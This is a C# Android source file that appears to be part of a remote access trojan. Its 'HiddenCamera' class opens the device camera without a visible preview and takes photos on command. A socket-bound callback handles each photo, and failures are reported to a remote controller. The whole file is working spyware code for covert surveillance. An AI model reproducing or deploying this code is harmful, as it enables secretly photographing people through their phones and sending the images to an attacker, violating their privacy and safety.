using Android.Hardware;
using Android.Hardware.Camera2;
using System;
using System.Net.Sockets;

namespace Task2
{
    public partial class HiddenCamera
    {
        Camera _camera;
        CameraInfo _cameraInfo;
        //RingList<int> _ringList;
        CameraFacing _currentCameraFacing;
        public HiddenCamera(CameraManager cameraManager)
        {
            _cameraInfo = new CameraInfo(cameraManager);
            //int[] cameraIDs = _cameraInfo.GetCameraIdArray();
            // _ringList = new RingList<int>(cameraIDs);
        }

        public void TakePhoto(Socket sckt)
        {
            Release();

            int currentCameraID = SwitchCamera();
            if (currentCameraID != 5)
            {
                SetParametersAndTakePhoto(currentCameraID, sckt);
            }
            else
            {
                try
                {
                    ((MainActivity)MainActivity.global_activity).soketimizeGonder("CAMNOT", "[VERI][0x09]");
                }
                catch (Exception) { }
            }
        }

        private void Release()
        {
            try
            {
                if (_camera != null)
                {
                    _camera.StopPreview();
                    _camera.Release();
                }
            }
            catch (Exception)
            {
            }
        }

        private int SwitchCamera()
        {
            try
            {
                int cameraId = int.Parse(MainValues.front_back);//NextCameraId();
                _camera = Camera.Open(cameraId);
                _currentCameraFacing = _cameraInfo.GetCameraFacing(cameraId);

                return cameraId;
            }
            catch (Exception) { return 5; }
        }

        private void SetParametersAndTakePhoto(int currentCameraId, Socket sck)
        {
            try
            {
                Camera.Parameters parameters = _camera.GetParameters();
                ModifyParameters(parameters);
                _camera.SetPreviewTexture(new Android.Graphics.SurfaceTexture(10));
                _camera.SetParameters(parameters);
                _camera.StartPreview();
                _camera.TakePicture(null, null, new PictureCallback(currentCameraId, sck));
            }
            catch (Exception)
            {
                Stop();
            }
        }
        public void Stop()
        {
            Release();
            _camera = null;
        }
        partial void ModifyParameters(Camera.Parameters oldParameters);

        /*
        private int NextCameraId()
            => _ringList.Next();
        */
    }
}